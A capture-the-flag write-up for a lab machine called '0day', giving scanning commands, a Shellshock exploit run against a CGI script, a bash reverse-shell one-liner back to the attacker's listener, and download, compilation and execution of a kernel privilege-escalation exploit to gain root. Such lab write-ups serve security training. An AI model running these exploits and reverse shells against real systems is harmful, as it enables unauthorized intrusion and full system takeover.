# 0day: CTF Solution Write-up - Target "0day"

---

## 🔎 Phase 1: Reconnaissance and Enumeration

### Port Scanning (Nmap)

We perform a thorough port scan to identify open ports, using a high minimum rate for speed.

nmap -p- --open -sS --min-rate 5000 -n -Pn <IP>

![Initial Nmap port scan results](assets/Captura de pantalla de 2025-10-01 17-51-14.png)

We confirm open ports (22 and 80) and proceed with a detailed version and service scan.
Bash

nmap -p22,80 -sCV <IP> -oN targeted

![Detailed service scan results for ports 22 and 80](assets/Captura de pantalla de 2025-10-01 17-53-45.png)

Directory Scanning (FFUF)

We run a simple FFUF scan to look for hidden directories.
Bash

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<IP>/FUZZ

![FFUF directory scanning results showing directory listing](assets/Captura de pantalla de 2025-10-01 17-57-07.png) ![Second FFUF result showing found directories](assets/Captura de pantalla de 2025-10-01 17-58-24.png)

We detect the /cgi-bin/ directory but do not have direct access (403 Forbidden).

Vulnerability Scanning (Nikto)

We execute a Nikto scan to identify known vulnerabilities in the web services.
Bash

nikto -h <IP>

The scan suggests that the script /cgi-bin/test.cgi may be vulnerable to Shellshock.

![Nikto scan results identifying the Shellshock vulnerability](assets/Captura de pantalla de 2025-10-01 18-02-55.png)

💥 Phase 2: Gaining Access

Exploit Search (Searchsploit)

We search for Shellshock exploits, focusing on the Apache web server as identified by Nikto.
Bash

searchsploit shellshock

![Searchsploit results for Shellshock](assets/Captura de pantalla de 2025-10-01 18-05:29.png)

We select the Apache remote code injection exploit (ID 34900).

![Selection of exploit 34900 for Apache](assets/Captura de pantalla de 2025-10-01 18-07-16.png)

We copy the exploit to our working directory:
Bash

searchsploit -m linux/remote/34900.py

![Command to copy the exploit script](assets/Captura de pantalla de 2025-10-01 18-08-54.png)

Exploit Execution and Reverse Shell

We analyze the script and execute it with a Netcat reverse shell payload.

    Step 1: Netcat Listener

    Open a Netcat listener session on our attacking host:
    Bash

nc -nvlp 4444

Step 2: Exploit Execution (Attacking Machine)
Bash

python2.7 34900.py payload=reverse rhost=<IP victim machine> lhost=<IP> lport=443

![Executing the Shellshock exploit with the reverse shell payload](assets/Captura de pantalla de 2025-10-01 18-13-07.png)

Step 3: Stable TTY Shell (Victim Machine)

From the initial shell, we execute a bash command to get a more stable shell on our Netcat listener (port 4444):
Bash

    bash -i &> /dev/tcp/<IP>/4444 0>&1

    ![Bash command for reverse shell on port 4444](assets/Captura de pantalla de 2025-10-01 18-16-34.png)

This grants us an interactive shell.

![Interactive shell obtained via Netcat](assets/Captura de pantalla de 2025-10-01 18-18-33.png)

User Flag

The user flag is found in the /home/ryan directory.

![User flag found in /home/ryan](assets/Captura de pantalla de 2025-10-01 18-19-52.png)

👑 Phase 3: Privilege Escalation (Privesc)

System Analysis

We observe that the /tmp directory has broad permissions, allowing us to download files—a good starting point for privesc.

![Wide permissions on the /tmp directory](assets/Captura de pantalla de 2025-10-01 18-21-06.png)

We check the kernel version for known vulnerabilities:
Bash

uname -a

![Output of uname -a showing the kernel version](assets/Captura de pantalla de 2025-10-01 18-24-06.png)

A quick search on ExploitDB reveals a privilege escalation exploit for this specific kernel version.

![Exploit search results for the specific kernel](assets/Captura de pantalla de 2025-10-01 18-24-56.png)

Exploit Compilation and Execution

    Step 1: Download Exploit

    Start a simple HTTP server on our attacking machine:
    Bash

python3 -m http.server 80

![HTTP server started on the attacking machine](assets/Captura de pantalla de 2025-10-01 18-26-15.png)

Download the exploit file (37292.c) to the /tmp directory on the victim machine using wget. ![Downloading the .c exploit file with wget](assets/Captura de pantalla de 2025-10-01 18-27-29.png)

Step 2: Compilation and PATH Adjustment

We attempt to compile the script:
Bash

gcc 37292.c -o exploit

If gcc is not found, we confirm its existence and temporarily adjust the PATH variable to include standard binary directories:
Bash

which gcc
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:$PATH

![Running 'which gcc' and setting the PATH variable](assets/Captura de pantalla de 2025-10-01 18-34-00.png)

We re-run the compilation: ![Successful compilation of the exploit](assets/Captura de pantalla de 2025-10-01 18-36-04.png)

Step 3: Execute and Gain Root

Execute the compiled binary:
Bash

    ./exploit

    We successfully escalate privileges to the root user. ![Executing the exploit and gaining root access](assets/Captura de pantalla de 2025-10-01 18-36-55.png)

Root Flag

Finally, we retrieve the root flag.
Bash

cat /root/root*

![Root flag retrieved](assets/Captura de pantalla de 2025-10-01 18-37-44.png)

Thank you for reading! This write-up documents the path to root on this target.
